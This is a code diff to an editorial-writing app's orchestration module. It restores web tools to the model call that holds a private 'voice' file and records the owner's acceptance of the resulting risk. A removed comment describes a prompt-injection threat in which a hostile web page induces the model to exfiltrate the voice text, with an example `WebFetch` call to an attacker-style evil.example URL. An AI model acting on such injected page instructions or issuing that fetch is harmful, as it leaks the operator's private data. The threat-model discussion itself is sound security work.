@@ -55,26 +55,36 @@ import { pinnedLocalModelForJob } from "./job-local-model.ts";
 
 export type { WriteEditorialInput, WriteEditorialResult } from "./editorial-orchestration.ts";
 
-/** Research supplies leads; the writer files an editorial with claims and
- * sources from the record research returned. The gathering pass is the only
- * call that gets the web tools (`EDITORIAL_TOOLS`); the writing call gets
- * none, because it is the one call whose context holds the private voice file
- * AND text gathered from untrusted pages — and an outbound fetch tool
- * reachable from that context would let a hostile page read the voice out
- * through a URL (SEC-3). Research is where web access belongs: it never sees
- * the voice. Both CLIs load the complete voice by file path, never as prompt
- * text in argv or application logs.
+/** Research supplies leads; the writer independently opens sources and files an
+ * editorial with claims and sources. Both subscription writers retain web
+ * research during writing — the voice file CONTAINS the research protocol
+ * (Stage L local record, packet/PDF/tape/parcel/CORA rules, triangulation, the
+ * surprise hunt, the local source ledger), so a writer given the voice and
+ * denied the tools cannot run the protocol it was told to run. Both CLIs load
+ * the complete voice by file path, never as prompt text in argv or application
+ * logs.
+ *
+ * UNIT U31 RESTORED THAT, and recorded what it costs. Units U12/U12b/c split
+ * the pair — a gathering pass with the tools and no voice, a writing pass with
+ * the voice and no tools — to close a real exfiltration path (a prompt-injected
+ * page inducing a fetch that carries style-guide text out of the machine).
+ * The owner weighed that against an editorial writer that cannot follow its own
+ * research protocol and chose the writer: SEC-3 is now an owner-accepted risk,
+ * stated in SECURITY.md, not a guard the tests hold. See `runClaudePair` and
+ * `runCodexPair` for the restored shapes, and `git show 992fef1c^:` for the
+ * exact code they were restored from.
  *
  * There is also a ONE-PASS-WRITING pair, for the writers with no tool loop at
  * all: the "Local model" pick, Automatic's DeepSeek v4.1 Flash rung, and the
  * newsroom's saved connections, which speak the OpenAI-compatible protocol over
  * HTTP. It makes a single WRITING call — the voice as the system message, never
- * an argument — but it is no longer unresearched (unit U30): the desk runs a
- * bounded research pass of its own first, and a no-tool model call plans its
- * queries and reads its captures back as findings. The writing pack says what
- * research ran, with each capture's URL and capture id. Which pair a candidate
- * takes is read from the registry entry's `kind` (via `providerRunsToolPass`),
- * not from its id; see `orchestrateEditorial`'s `runPair`. */
+ * an argument — but it is not unresearched (units U30 + U31): the desk runs a
+ * research pass of its own first, holding the same voice file so the protocol
+ * governs the planning and the selection too, and the model reads the desk's
+ * captures back as findings. The writing pack says what research ran, with each
+ * capture's URL and capture id. Which pair a candidate takes is read from the
+ * registry entry's `kind` (via `providerRunsToolPass`), not from its id; see
+ * `orchestrateEditorial`'s `runPair`. */
 
 /**
  * Editorials take tens of minutes, not seconds. The voice researches first.
@@ -214,9 +224,7 @@ export async function writeEditorial(
     The desk's own research, memoized for exactly the same reason (unit U30):
     the ladder can move a no-tool piece from DeepSeek to another no-tool rung,
     and the second rung must receive what the desk already found rather than pay
-    for the same six searches and eight page opens again. It is also what keeps
-    SEC-3's shape stable across a fallback -- the record handed to the writing
-    call is captures, and no rung's research call is ever given the voice.
+    for the same searches and page opens a second time.
   */
   let completedDeskResearch: DeskResearchOutcome | null = null;
   /*
@@ -244,17 +252,21 @@ export async function writeEditorial(
 
   /**
    * The desk's research pass, run once per piece for a writer that has no web
-   * tools of its own (unit U30).
+   * tools of its own (units U30 + U31).
    *
    * `chat` is the same no-tool transport the writing call uses, so the model
-   * that plans the queries and the model that reads the captures are the rung
-   * the editor picked -- and, in a test, the same `grokChat` seam, which is what
-   * makes the SEC-3 assertion possible: every call this piece makes arrives at
-   * one recorder, and the research calls must be the ones with no voice in them.
+   * that plans the searches and the model that reads the desk's records are the
+   * rung the editor picked. `voice` is the operator's voice file, and since U31
+   * it is the SYSTEM MESSAGE of both research calls exactly as it is of the
+   * writing call: the voice contains the research protocol, so a plan made
+   * without it is a plan made without the protocol. A test records all three
+   * calls of a piece through one `grokChat` seam, which is how "the research
+   * holds the voice" is asserted rather than assumed.
    */
   const deskResearchFor = async (
     editorialInput: WriteEditorialInput,
     researchPack: string,
+    voice: string,
     chat: typeof grokChat,
     options: { choice: OpinionModelChoice; localModel?: LocalModelOverride; exactModel?: string },
   ): Promise<DeskResearchOutcome> => {
@@ -272,6 +284,7 @@ export async function writeEditorial(
         newsroomId: editorialInput.newsroomId,
         subject: editorialInput.subject,
         askedFor: editorialInput.askedFor,
+        voice,
         researchPack,
         paper: {
           city: editorialInput.paper?.city,
@@ -338,17 +351,26 @@ export async function writeEditorial(
         system: "",
         systemPromptFile: found.voice.path,
         /*
-          No tools here, and no empty allow-list either. This is the one call
-          whose context holds the operator's private voice file AND the
-          gathering pass's summary of untrusted pages, so it must have no way
-          to reach the network: a page that talked the writer into
-          `WebFetch https://evil.example/?d=<voice or draft>` would publish
-          the voice by URL. `noTools` drops the tool surface from the request
-          (`--tools ""`) rather than pre-denying a visible one, so there is
-          nothing live to try. Web access stays on the research call above,
-          which never sees the voice (SEC-3).
+          UNIT U31 -- THE WRITER RESEARCHES AND WRITES IN ONE RUN.
+
+          Restored from before U12 (`git show 992fef1c^:src/lib/news/
+          editorial.server.ts`): this call holds the operator's voice file by
+          path AND the web tools, exactly as it did then. The reason is in the
+          file itself -- the voice contains the research protocol (Stage L
+          local record, packet/PDF/tape/parcel/CORA rules, triangulation, the
+          surprise hunt, the local source ledger) -- so a writer given the
+          voice but denied the tools cannot run the protocol it was told to
+          run, and a gathering pass denied the voice researches without it.
+
+          SEC-3 is now an owner-accepted risk, recorded in SECURITY.md: a
+          prompt-injected page could in principle induce a fetch carrying
+          style-guide text. The owner accepted that for a single-person
+          newsroom over a writer that cannot follow its own protocol.
+          Everything else stays: the voice is never an argument and never
+          logged (see `voice.server.ts`), and the path is validated before it
+          is read.
         */
-        noTools: true,
+        allowedTools: EDITORIAL_TOOLS,
         user: buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
@@ -384,6 +406,19 @@ export async function writeEditorial(
       return codexChat({
         system: "",
         systemPromptFile: found.voice.path,
+        /*
+          UNIT U31 -- the writer gets its web search back (U12b took it away).
+
+          U12b passed `--disable standalone_web_search` here so the writing
+          call could not search. That is the capability the voice's research
+          protocol needs, so it is asked for again -- and asked for BY NAME
+          rather than left to the CLI: before U12 this call named nothing at
+          all and inherited codex-cli 0.145.0's own default, which is `false`
+          for `standalone_web_search`. Stating `webSearch: true` is what makes
+          the restored capability a property a test can hold instead of a
+          default the installed CLI is free to change.
+        */
+        webSearch: true,
         user: buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
@@ -464,7 +499,7 @@ export async function writeEditorial(
         says it: the desk searched and read, and the writing pack carries the
         counts, the captures' URLs and their capture ids.
       */
-      const desk = await deskResearchFor(editorialInput, researchPack, chat, {
+      const desk = await deskResearchFor(editorialInput, researchPack, voice.text, chat, {
         choice,
         ...(localModel ? { localModel } : {}),
         exactModel,
@@ -498,18 +533,18 @@ export async function writeEditorial(
     /*
       A saved connection is an OpenAI-compatible endpoint too, so it has no tool
       loop either and gets the same desk-run research the local pair does (unit
-      U30). Before U30 this pair handed the writing pack no `gatheringPass` flag
-      at all and so fell through to the two-pass wording -- "by a separate pass
+      U30). Before U30 this pair handed the writing pack no research record at
+      all and so fell through to the two-pass wording -- "by a separate pass
       that searched and opened public sources before you" -- which was never
       true of a custom connection. Now the pack describes the pass that actually
-      ran.
+      ran, under the same voice (unit U31).
     */
     runCustomPair: async ({ input: editorialInput, researchPack }) => {
       const voice = await readVoiceTextForLocalModel();
       if (!voice.ok) return voice;
       const { grokChat } = await import("./ai.ts");
       const chat = deps.grokChat ?? grokChat;
-      const desk = await deskResearchFor(editorialInput, researchPack, chat, {
+      const desk = await deskResearchFor(editorialInput, researchPack, voice.text, chat, {
         choice: opinionModelChoice(editorialInput.modelChoice),
       });
       await reportStage(editorialInput)("Writing the editorial");
